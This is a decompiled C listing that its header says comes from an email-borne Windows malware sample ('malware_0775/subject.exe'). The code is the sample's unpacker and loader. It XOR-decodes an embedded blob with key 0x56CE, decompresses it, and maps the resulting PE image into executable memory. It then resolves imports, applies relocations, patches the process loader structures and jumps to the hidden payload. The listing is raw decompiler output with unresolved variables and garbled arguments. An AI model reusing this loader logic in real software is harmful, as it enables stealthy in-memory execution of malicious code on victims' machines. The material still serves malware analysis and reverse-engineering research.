// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0775/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401020(Eq_25 dwArg04, Eq_25 dwArg08, int32 dwArg0C)
{
	globals->dw40702C = 0x00000000;
	while (globals->dw40702C <u dwArg0C)
	{
		dwArg04[globals->dw40702C] = dwArg08[globals->dw40702C];
		globals->dw40702C = globals->dw40702C + 0x00000001;
	}
	return;
}

void fn004010B0(word32 ebx, word32 esi, word32 edi, Eq_110 * fs, word32 dwArg04)
{
	Eq_25 eax_18 = GetModuleHandleA(0x00000000);
	if ((dwArg04 & 0x0000FFFF) != 0x00000000)
		globals->dw407044 = 0x00000000;
	else
		globals->dw407044 = 0x00000001;
	if (dwArg04 == 0x00000000)
		globals->dw407044 = 0x00000000;
	if (globals->dw407044 != 0x00000000)
		globals->t407034 = dwArg04;
	fp->dwFFFFFF60 = 0x00406F8C;
	code * eax_42 = fn00401270(LoadLibraryA(0x00406F98), 0x00000000);
	fp->dwFFFFFF60 = &fp->dwFFFFFF60;
	eax_42();
	if (eax_42 != null)
		return;
	else
	{
		up32 ecx_98 = globals->dw403000;
		word32 eax_101 = globals->dw403004;
		up32 dwLoc08_103 = 0x00000000;
		while (dwLoc08_103 <u ecx_98)
		{
			(dwLoc08_103 + 0x00403000)->dw0008 = (dwLoc08_103 + 0x00403000)->dw0008 ^ 0x000056CE;
			dwLoc08_103 = dwLoc08_103 + 0x00000008;
		}
		globals->dw407040 = fn00401830(eax_101);
		fn004019E0(0x00403008, globals->dw407040, ecx_98);
		globals->dw407030 = edi;
		globals->dw407028 = esi;
		globals->dw40703C = ebx;
		globals->ptr407048 = fs->ptr0018;
		globals->dw407038 = fp - 0x00000004;
		if (globals->dw407044 != 0x00000000)
			fn00401860(0x00401234 - dwArg04, dwArg04);
		else
			fn00401860(0x00401234 - eax_18, eax_18);
		word32 edx_151 = globals->dw407040;
		fn00401290(fp - 0x00000004, edx_151);
		Mem147[0x0040704C:word32]();
		return;
	}
}

word32 fn00401270(word32 dwArg04, word32 dwArg08)
{
	return GetProcAddress(dwArg04, dwArg08);
}

void fn00401290(word32 ebp, word32 dwArg04)
{
	word32 edx_16 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Eq_173 * dwLoc2C_158 = &edx_16->w0014 + (word32) edx_16->w0014;
	Eq_25 eax_33 = VirtualAlloc(0x00000000, edx_16->t0050, 0x00003000, 0x00000040);
	if (eax_33 == 0x00000000)
		;
	else
	{
		Mem121[fp - 0x00000058:word32] = Mem0[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem0[edx_16 + 0x00000006:word16] *s 0x00000028;
		Mem124[fp - 0x0000005C:word32] = dwArg04;
		fn00401020(eax_33, 0x00003000, 0x00000040);
		fp->dwFFFFFFE4 = 0x00406FC0;
		fp->dwFFFFFFE4 = 0x00406FD0;
		Mem137[fp - 0x0000005C:word32] = GetModuleHandleA(0x00003000);
		code * eax_138 = GetProcAddress((Eq_1079 *) 0x00003000, 0x00000040);
		fp->dwFFFFFFE4 = 0x00406FE0;
		fp->dwFFFFFFE4 = 0x00406FF4;
		Mem148[fp - 0x0000005C:word32] = GetModuleHandleA((Eq_1079 *) 0x00003000);
		code * eax_149 = GetProcAddress((Eq_1079 *) 0x00003000, 0x00000040);
		up32 dwLoc10_152 = 0x00000000;
		while (dwLoc10_152 <u (word32) edx_16->w0006)
		{
			if (dwLoc2C_158->dw0014 != 0x00000000 && dwLoc2C_158->dw0010 != 0x00000000)
			{
				word32 eax_192 = dwLoc2C_158->dw0010 - 0x00000001 + edx_16->t003C;
				fn00401020(eax_33 + Mem148[dwLoc2C_158 + 0x0000000C:word32], dwArg04 + Mem148[dwLoc2C_158 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_192) % edx_16->t003C, eax_192) /u edx_16->t003C *s edx_16->t003C);
			}
			dwLoc2C_158 = dwLoc2C_158 + 1;
			dwLoc10_152 = dwLoc10_152 + 0x00000001;
		}
		word32 ecx_220 = eax_33 + Mem148[eax_33 + 0x0000003C:word32];
		word32 eax_226 = Mem148[ecx_220 + 0x00000050:word32];
		fp->dwFFFFFFE4 = 0x00000004;
		eax_149();
		if (eax_226 == 0x00000000)
			;
		else
		{
			word32 dwLoc50_248 = eax_33 + Mem232[ecx_220 + 0x00000080:word32];
			while (dwLoc50_248->dw0010 != 0x00000000)
			{
				Eq_336 * dwLoc38_276;
				Eq_337 * dwLoc28_275;
				word32 eax_269 = LoadLibraryA(eax_33 + Mem232[dwLoc50_248 + 0x0000000C:word32]);
				if (dwLoc50_248->dw0000 != 0x00000000)
				{
					dwLoc28_275 = eax_33 + Mem232[dwLoc50_248 + 0x00000000:word32];
					dwLoc38_276 = eax_33 + Mem232[dwLoc50_248 + 0x00000010:word32];
				}
				else
				{
					dwLoc28_275 = eax_33 + Mem232[dwLoc50_248 + 0x00000010:word32];
					dwLoc38_276 = eax_33 + Mem232[dwLoc50_248 + 0x00000000:word32];
				}
				if (dwLoc50_248->dw0010 != 0x00000000 && dwLoc50_248->dw0000 != 0x00000000)
				{
					fp->dwFFFFFFE4 = 0x00000001;
					goto l0040146F;
				}
l0040146F:
				while (dwLoc28_275->ptr0000 != null)
				{
					if ((dwLoc28_275->ptr0000 & 0x80000000) != 0x00000000)
						dwLoc28_275->ptr0000 = fn00401270(eax_269, dwLoc28_275->ptr0000 & 0x7FFFFFFF);
					else
						Mem356[dwLoc28_275 + 0x00000000:word32] = fn00401270(eax_269, Mem232[dwLoc28_275 + 0x00000000:word32] + 0x00000002 + eax_33);
					if (dwLoc28_275->ptr0000 == null)
						goto l004017B2;
					if (0x00000000 != 0x00000000)
						dwLoc38_276->ptr0000 = dwLoc28_275->ptr0000;
					dwLoc28_275 = dwLoc28_275 + 1;
					dwLoc38_276 = dwLoc38_276 + 1;
				}
				dwLoc50_248 = dwLoc50_248 + 1;
			}
			if (globals->dw407044 != 0x00000000)
			{
				word32 edx_661 = Mem232[0x00407034:word32] - Mem232[ecx_220 + 0x00000034:word32];
				if (Mem232[ecx_220 + 0x000000A4:word32] != 0x00000000)
				{
					word32 dwLoc24_670 = eax_33 + Mem232[ecx_220 + 0x000000A0:word32];
					while (dwLoc24_670->dw0004 != 0x00000000)
					{
						uint32 edx_685 = dwLoc24_670->dw0004 - 0x00000008 >>u 0x00000001;
						word16 * eax_688[] = &dwLoc24_670->a0008[0];
						uint32 dwLoc10_691 = 0x00000000;
						while (dwLoc10_691 <u edx_685)
						{
							if ((word32) eax_688[dwLoc10_691] >> 0x0000000C == 0x00000003)
								(eax_33 + Mem232[dwLoc24_670 + 0x00000000:word32])[(word32) eax_688[dwLoc10_691] & 0x00000FFF] = (eax_33 + Mem232[dwLoc24_670 + 0x00000000:word32])[(word32) eax_688[dwLoc10_691] & 0x00000FFF] + edx_661;
							dwLoc10_691 = dwLoc10_691 + 0x00000001;
						}
						dwLoc24_670 = dwLoc24_670 + Mem232[dwLoc24_670 + 0x00000004:word32];
					}
				}
			}
			Eq_25 eax_415;
			word32 esp_420;
			code * eax_402 = GetProcAddress(GetModuleHandleA(0x00407014), 0x00407004);
			if (globals->dw407044 != 0x00000000)
			{
				Eq_25 edx_626 = globals->t407034;
				Mem628[fp - 0x00000070:word32] = edx_626;
				eax_415 = eax_226;
				esp_420 = fp - 0x00000084;
				eax_402();
				globals->t407024 = eax_226;
			}
			else
			{
				word32 edx_643 = Mem232[ecx_220 + 0x00000034:word32];
				Mem645[fp - 0x00000070:word32] = edx_643;
				eax_415 = eax_226;
				esp_420 = fp - 0x00000084;
				eax_402();
				globals->t407024 = eax_226;
			}
			if (globals->t407024 == 0x00000000)
			{
				word32 esp_493;
				if (globals->dw407044 != 0x00000000)
				{
					esp_493 = fp - 0x00000088;
					eax_138();
					if (eax_415 == 0x00000000)
					{
						esp_493 = fp - 0x00000094;
						dwLoc14();
						if (eax_415 == 0x00000000)
							;
						else
						{
l00401676:
l004016A2:
							if (globals->dw407044 != 0x00000000)
							{
								Eq_25 ecx_537 = globals->t407034;
								Eq_693 * esp_538 = esp_493 - 0x00000004;
								esp_538->t0000 = ecx_537;
								Mem541[esp_538 - 0x00000004:word32] = 0x00000000;
								Mem543[esp_538 - 0x00000008:word32] = 0x00000000;
								Mem545[esp_538 - 0x0000000C:word32] = 0x00000000;
								Mem547[esp_538 - 0x00000010:word32] = 0x00000022;
								esp_538->t0000 = eax_226;
								esp_420 = esp_538 - 0x00000014;
								eax_402();
								globals->t407024 = eax_415;
							}
							else
							{
								word32 ecx_553 = Mem232[ecx_220 + 0x00000034:word32];
								Eq_662 * esp_554 = esp_493 - 0x00000004;
								esp_554->t0000 = ecx_553;
								Mem557[esp_554 - 0x00000004:word32] = 0x00000000;
								Mem559[esp_554 - 0x00000008:word32] = 0x00000000;
								Mem561[esp_554 - 0x0000000C:word32] = 0x00000000;
								Mem563[esp_554 - 0x00000010:word32] = 0x00000022;
								esp_554->t0000 = eax_226;
								esp_420 = esp_554 - 0x00000014;
								eax_402();
								globals->t407024 = ecx_220;
							}
							if (globals->t407024 == 0x00000000)
								if (globals->dw407044 == 0x00000000)
								{
									Eq_768 * esp_508 = esp_420 - 0x00000004;
									esp_508->t0000.u0 = 0x00000040;
									esp_508->t0000.u0 = 0x00003000;
									Mem515[esp_508 - 0x00000008:word32] = Mem511[ecx_220 + 0x00000050:word32];
									Mem519[esp_508 - 0x0000000C:word32] = Mem515[ecx_220 + 0x00000034:word32];
									globals->t407024 = VirtualAlloc(esp_508->t0000, esp_508->t0000, esp_508->t0000, esp_508->t0000);
									esp_420 = &esp_508->t0000;
								}
								else
								{
									Eq_729 * esp_523 = esp_420 - 0x00000004;
									esp_523->t0000.u0 = 0x00000040;
									esp_523->t0000.u0 = 0x00003000;
									Mem530[esp_523 - 0x00000008:word32] = Mem526[ecx_220 + 0x00000050:word32];
									Mem533[esp_523 - 0x0000000C:word32] = Mem530[0x00407034:word32];
									globals->t407024 = VirtualAlloc(esp_523->t0000, esp_523->t0000, esp_523->t0000, esp_523->t0000);
									esp_420 = &esp_523->t0000;
								}
l00401736:
							Eq_553 * esp_434 = esp_420 - 0x00000004;
							esp_434->t0000 = eax_226;
							CloseHandle(esp_434->t0000);
							Mem441[esp_434 + 0x00000000:word32] = Mem435[ecx_220 + 0x00000050:word32];
							esp_434->t0000 = eax_33;
							esp_434->t0000 = globals->t407024;
							fn00401020(dwArg00, dwArg04, dwArg08);
							if (globals->dw407044 != 0x00000000)
							{
								Mem468[esp_434 + 0x00000000:word32] = Mem447[0x00407024:word32] + Mem447[ecx_220 + 0x00000028:word32];
								esp_434->t0000 = globals->t407034;
								fn004017C0(dwArg00, dwArg04);
							}
							else
							{
								esp_434->t0000 = globals->t407024;
								fn004019B0(dwArg00);
							}
							Mem458[0x0040704C:word32] = Mem447[0x00407024:word32] + Mem447[ecx_220 + 0x00000028:word32];
							Mem461[ecx_220 + 0x00000028:word32] = Mem458[0x0040704C:word32];
						}
					}
					else
						goto l00401676;
				}
				else
				{
					eax_415 = ecx_220;
					esp_493 = fp - 0x00000088;
					eax_138();
					if (ecx_220 == 0x00000000)
					{
						eax_415 = Mem232[ecx_220 + 0x00000034:word32];
						esp_493 = fp - 0x00000094;
						dwLoc14();
						if (eax_415 == 0x00000000)
							;
						else
							goto l004016A2;
					}
					else
						goto l004016A2;
				}
			}
			else
				goto l00401736;
		}
	}
l004017B2:
	return;
}

void fn004017C0(Eq_25 dwArg04, Eq_25 dwArg08)
{
	Eq_808 * ecx_14 = globals->ptr407048->ptr0030->ptr000C->ptr000C;
	Eq_808 * dwLoc0C_15 = ecx_14;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc0C_15 == null)
			goto l0040182C;
		if (dwLoc0C_15->dw0018 == dwArg04)
		{
			dwLoc0C_15->dw001C = dwArg08;
			goto l0040182C;
		}
		Eq_808 * eax_53 = dwLoc0C_15->ptr0000;
		dwLoc0C_15 = eax_53;
		if (eax_53 == ecx_14)
			goto l0040182C;
	}
l0040182C:
	return;
}

word32 fn00401830(word32 dwArg04)
{
	return VirtualAlloc(0x00000000, dwArg04, 0x00003000, 0x00000004);
}

void fn00401860(word32 dwArg04, Eq_25 dwArg08)
{
fn00401860_entry:
l00401860:
	Eq_25 dwLoc20_13
	branch globals->dw407044 == 0x00000000 l0040187A
l00401870:
	dwLoc20_13 = globals->t407034;
	goto l00401880
l0040187A:
	dwLoc20_13 = dwArg08;
l00401880:
	word32 eax_16 = dwLoc20_13 + Mem0[dwLoc20_13 + 0x0000003C:word32]
	globals->t407024 = VirtualAlloc(0x00000000, eax_16->t0050, 0x00003000, 0x00000040);
	branch globals->t407024 != 0x00000000 l004018BA
l004018B0:
	goto l004019A9
l004018BA:
	fp->tFFFFFFD8 = eax_16->t0050;
	fp->tFFFFFFD8 = dwLoc20_13;
	fn00401020(globals->t407024, 0x00003000, 0x00000040)
	word32 ecx_50 = globals->t407024 - dwLoc20_13
	branch eax_16->dw00A4 == 0x00000000 l0040199E
l004018EF:
	Eq_899 * dwLoc0C_144 = dwLoc20_13 + Mem44[eax_16 + 0x000000A0:word32]
l004018FE:
	branch dwLoc0C_144->dw0004 == 0x00000000 l0040199E
l0040190B:
	uint32 ecx_92 = dwLoc0C_144->dw0004 - 0x00000008 >>u 0x00000001
	word16 * edx_95[] = &dwLoc0C_144->a0008[0]
	uint32 dwLoc08_101 = 0x00000000
	goto l00401934
l0040192B:
	dwLoc08_101 = dwLoc08_101 + 0x00000001;
l00401934:
	branch dwLoc08_101 >=u ecx_92 l0040198D
l0040193C:
	branch (word32) edx_95[dwLoc08_101] >> 0x0000000C != 0x00000003 l0040198B
l0040194E:
	(Mem44[0x00407024:word32] + Mem44[dwLoc0C_144 + 0x00000000:word32])[(word32) edx_95[dwLoc08_101] & 0x00000FFF] = (Mem44[0x00407024:word32] + Mem44[dwLoc0C_144 + 0x00000000:word32])[(word32) edx_95[dwLoc08_101] & 0x00000FFF] + ecx_50;
l0040198B:
	goto l0040192B
l0040198D:
	dwLoc0C_144 = dwLoc0C_144 + Mem44[dwLoc0C_144 + 0x00000004:word32];
	goto l004018FE
l0040199E:
l004019A9:
	return
fn00401860_exit:
}

void fn004019B0(Eq_25 dwArg04)
{
	Eq_112 * edx_7 = globals->ptr407048;
	edx_7->ptr0030->dw0008 = dwArg04;
	return;
}

void fn004019E0(ptr32 dwArg04, word32 dwArg08, up32 dwArg0C)
{
	up32 dwLoc0C_112 = 0x00000001;
	byte cl_12 = *dwArg04;
	word32 dwLoc18_118 = 0x00000000;
	do
	{
		up32 ecx_34 = dwLoc0C_112 + 0x00000001;
		byte al_31 = dwArg04[dwLoc0C_112];
		dwLoc0C_112 = ecx_34;
		if ((word32) al_31 != (word32) cl_12)
		{
			dwArg08[dwLoc18_118] = al_31;
			dwLoc18_118 = dwLoc18_118 + 0x00000001;
		}
		else if ((word32) dwArg04[ecx_34] == 0x00000000)
		{
			dwArg08[dwLoc18_118] = cl_12;
			dwLoc18_118 = dwLoc18_118 + 0x00000001;
			dwLoc0C_112 = ecx_34 + 0x00000001;
		}
		else
		{
			word32 eax_98 = fn00401AE0(fp - 0x00000010, dwArg04 + ecx_34) + ecx_34;
			dwLoc0C_112 = fn00401AE0(fp - 0x00000020, dwArg04 + eax_98) + eax_98;
			up32 dwLoc1C_113 = 0x00000000;
			while (dwLoc1C_113 <u dwLoc10)
			{
				dwArg08[dwLoc18_118] = dwArg08[dwLoc18_118 - dwLoc20];
				dwLoc18_118 = dwLoc18_118 + 0x00000001;
				dwLoc1C_113 = dwLoc1C_113 + 0x00000001;
			}
		}
	} while (dwLoc0C_112 <u dwArg0C);
	return;
}

word32 fn00401AE0(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc08_12 = 0x00000000;
	word32 dwLoc10_13 = 0x00000000;
	do
	{
		word32 ecx_16 = (word32) dwArg08->b0000;
		word32 ecx_26 = ecx_16 & 0x0000007F | dwLoc08_12 << 0x00000007;
		word32 edx_29 = dwLoc10_13 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc08_12 = ecx_26;
		dwLoc10_13 = edx_29;
	} while ((ecx_16 & 0x00000080) != 0x00000000);
	*dwArg04 = ecx_26;
	return edx_29;
}

